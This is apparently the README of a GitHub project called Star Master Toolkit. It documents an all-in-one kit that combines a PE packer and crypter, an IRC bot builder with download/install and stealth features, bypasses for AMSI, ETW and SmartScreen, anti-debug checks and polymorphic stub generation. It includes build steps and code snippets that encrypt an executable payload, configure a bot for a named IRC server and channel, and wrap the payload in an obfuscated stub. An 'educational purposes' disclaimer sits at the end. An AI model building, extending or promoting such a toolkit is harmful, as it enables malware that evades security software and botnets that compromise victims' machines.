# Star Master Toolkit v2.0.0

> **Unified Security Tools Platform with Enhanced RNG Seeding**

A comprehensive, cross-platform toolkit that consolidates PE packing, IRC bot building, encryption engines, security bypasses, and obfuscation techniques into a single unified platform.

## 🌟 Key Features

### Enhanced RNG System
- **Maximum Entropy Seeding**: Uses `std::random_device` + `std::seed_seq` for cryptographically strong randomness
- **Multi-Source Entropy**: Hardware random device, high-resolution timing, memory addresses, system counters
- **Automatic Reseeding**: Fresh entropy for each major operation ensures maximum uniqueness
- **Platform-Specific Sources**: Leverages Windows performance counters and Unix process IDs

### Core Components

#### 1. PE Packer & Encryption Engine
- **Cross-Platform Encryption**: XOR, AES-256-CBC, ChaCha20 implementations
- **Enhanced Key Generation**: Each key is unique with maximum entropy
- **Stub Linker Support**: Keys are embedded with markers for extraction
- **Anti-Analysis Features**: Multiple layers of obfuscation

#### 2. Enhanced IRC Bot Builder
- **Random Nickname Generation**: Entropy-based unique nicknames
- **Download/Install Capabilities**: Cross-platform file operations
- **Botkiller Features**: Self-defense and cleanup mechanisms
- **Stealth Mode**: Silent operation with trace removal

#### 3. Security Bypass Tools
- **AMSI Bypass**: Windows Antimalware Scan Interface neutralization
- **ETW Bypass**: Event Tracing for Windows suppression
- **Anti-Debug**: Multiple detection and evasion techniques
- **SmartScreen Bypass**: Windows security feature circumvention

#### 4. Polymorphic Code Generator
- **Variable Name Obfuscation**: Entropy-based random identifiers
- **Function Name Generation**: Semantic-aware random naming
- **Code Structure Variation**: Dynamic stub generation
- **Embedded Payload Support**: Encrypted payload integration

## 🚀 Installation & Build

### Prerequisites

**Windows:**
- Visual Studio 2019+ or MinGW-w64
- CMake 3.15+
- Windows SDK 10.0+

**Linux:**
- GCC 9+ or Clang 10+
- CMake 3.15+
- libcurl development headers: `sudo apt install libcurl4-openssl-dev`

### Building

```bash
# Clone repository
git clone https://github.com/ItsMehRAWRXD/Star.git
cd Star

# Create build directory
mkdir build && cd build

# Configure and build
cmake ..
cmake --build . --config Release

# Install (optional)
cmake --install .
```

### Cross-Compilation (Linux → Windows)

```bash
# Install MinGW cross-compiler
sudo apt install mingw-w64

# Configure for Windows target
cmake -DCMAKE_TOOLCHAIN_FILE=../cmake/mingw-w64.cmake ..
cmake --build . --config Release
```

## 💻 Usage

### Interactive Mode
```bash
./StarMasterToolkit
```

### Component Usage

#### 1. PE Packer
```cpp
// Generate encryption keys with enhanced entropy
auto keys = CrossPlatformEncryption::generateKeys(
    CrossPlatformEncryption::EncryptionMethod::AES_256_CBC
);

// Each key generation uses fresh entropy sources
std::vector<uint8_t> payload = readFile("input.exe");
auto encrypted = CrossPlatformEncryption::encryptXOR(payload, keys.key);
```

#### 2. IRC Bot Builder
```cpp
EnhancedIRCBotBuilder builder;
builder.setServer("irc.rizon.net", 6667);
builder.setChannel("#rawr");
builder.enableRandomNicknames(true);
builder.enableDownloads(true);
builder.enableBotkillerFeatures(true);

std::string botSource = builder.generateBotSource();
```

#### 3. Polymorphic Generator
```cpp
// Generate unique obfuscated stub with embedded payload
std::string stub = PolymorphicGenerator::generateObfuscatedStub(
    encrypted_payload, encryption_keys
);
```

## 🔧 Configuration

### RNG Entropy Sources
The toolkit uses multiple entropy sources for maximum randomness:

1. **Hardware Random Device**: `std::random_device`
2. **High-Resolution Timing**: Nanosecond precision timestamps
3. **Memory Addresses**: Stack and heap address entropy
4. **Thread/Process IDs**: System-specific identifiers
5. **Performance Counters**: Platform-specific timing sources

### Encryption Methods
- **XOR**: Enhanced with rotation and position-dependent operations
- **AES-256-CBC**: Industry-standard encryption with random IVs
- **ChaCha20**: Stream cipher with 96-bit nonces

### Security Features
- **Anti-Debug**: Multiple detection methods (PEB, heap flags, TracerPid)
- **AMSI Bypass**: Runtime patching of scan functions
- **ETW Bypass**: Event logging suppression
- **Random Delays**: Timing-based evasion

## 📋 Menu Options

```
╔═══════════════════════════════════════════════════════════════╗
║                     STAR MASTER TOOLKIT v2.0                 ║
║               Unified Security Tools Platform                 ║
║                Enhanced RNG + Maximum Entropy                ║
╠═══════════════════════════════════════════════════════════════╣
║  [1] PE Packer & Encryption Engine                          ║
║  [2] Enhanced IRC Bot Builder                               ║
║  [3] Security Bypass Tools                                  ║
║  [4] Polymorphic Code Generator                             ║
║  [5] Obfuscated Stub Generator                              ║
║  [6] All-in-One Builder                                     ║
║  [0] Exit                                                   ║
╚═══════════════════════════════════════════════════════════════╝
```

## 🛡️ Security Considerations

### Enhanced RNG Implementation
- **Reseeding Strategy**: Fresh entropy for each stub generation
- **Entropy Quality**: Multiple independent sources combined with `std::seed_seq`
- **Uniqueness Guarantee**: Each generated output is cryptographically unique

### Stub Linker Integration
- **Key Extraction**: Markers allow linkers to extract keys without regeneration
- **Embedded Patterns**: `0xDEADBEEFCAFEBABE` (key) and `0xFEEDFACEDEADC0DE` (IV)
- **Binary Compatibility**: Keys maintain positions for automated extraction

### Anti-Analysis Features
- **Multiple Evasion Layers**: Debug detection, timing analysis, memory protection
- **Dynamic Code Generation**: No static signatures or patterns
- **Cross-Platform Compatibility**: Consistent behavior across Windows/Linux

## 🔍 Technical Details

### RNG Enhancement Specifications
```cpp
class EnhancedRNG {
    // Multi-source entropy collection
    static void reseedRNG() {
        std::vector<std::uint32_t> seed_data;
        
        // 8 hardware random values
        std::random_device rd;
        for (int i = 0; i < 8; ++i) {
            seed_data.push_back(rd());
        }
        
        // High-resolution timing
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = now.time_since_epoch();
        seed_data.push_back(static_cast<std::uint32_t>(duration.count()));
        seed_data.push_back(static_cast<std::uint32_t>(duration.count() >> 32));
        
        // Platform-specific entropy
        #ifdef _WIN32
            LARGE_INTEGER perf_counter;
            QueryPerformanceCounter(&perf_counter);
            seed_data.push_back(static_cast<std::uint32_t>(perf_counter.QuadPart));
        #else
            seed_data.push_back(static_cast<std::uint32_t>(getpid()));
        #endif
        
        // Proper entropy distribution
        std::seed_seq seed_sequence(seed_data.begin(), seed_data.end());
        global_rng.seed(seed_sequence);
    }
};
```

### Generated Stub Features
- **Anti-Debug Detection**: Multiple methods for debugger presence
- **Random Delays**: Entropy-based timing variations
- **Memory Protection**: Cross-platform executable allocation
- **Embedded Keys**: Marker-based key/IV extraction
- **Layered Decryption**: Multiple XOR stages with position encoding

## 📁 File Structure
```
StarMasterToolkit/
├── StarMasterToolkit.cpp    # Main toolkit implementation
├── CMakeLists.txt           # Build configuration
├── README.md                # This documentation
├── examples/                # Usage examples
├── tests/                   # Unit tests
└── docs/                    # Additional documentation
```

## 🤝 Integration with Existing Tools

### PE Packer Integration
- Compatible with existing VS2022 GUI Benign Packer
- Enhanced encryption with unique keys per build
- Fixed stub linker key extraction

### IRC Bot Enhancement
- Builds upon previous mIRC bot builder
- Added random nickname generation
- Integrated download/install capabilities
- Comprehensive botkiller features

### Obfuscation Integration
- Incorporates provided security bypass snippets
- Enhanced anti-debug techniques
- Polymorphic code generation

## 🔄 Version History

### v2.0.0 (Current)
- **Enhanced RNG System**: `std::random_device` + `std::seed_seq` implementation
- **Stub Linker Support**: Key extraction without regeneration
- **Cross-Platform Unified**: Windows/Linux compatibility
- **All-in-One Integration**: Consolidated all previous tools

### v1.x (Previous Versions)
- Individual tool implementations
- Basic encryption support
- Windows-only functionality

## 📞 Support

For issues, questions, or contributions:
- **GitHub Issues**: [Repository Issues](https://github.com/ItsMehRAWRXD/Star/issues)
- **Documentation**: See `docs/` directory for detailed guides
- **Examples**: Check `examples/` for usage demonstrations

## ⚖️ License

This toolkit is provided for educational and research purposes. Users are responsible for compliance with all applicable laws and regulations.

---

**Star Master Toolkit v2.0.0** - *Unified Security Tools Platform*  
*Enhanced RNG + Maximum Entropy for Unique Code Generation* 
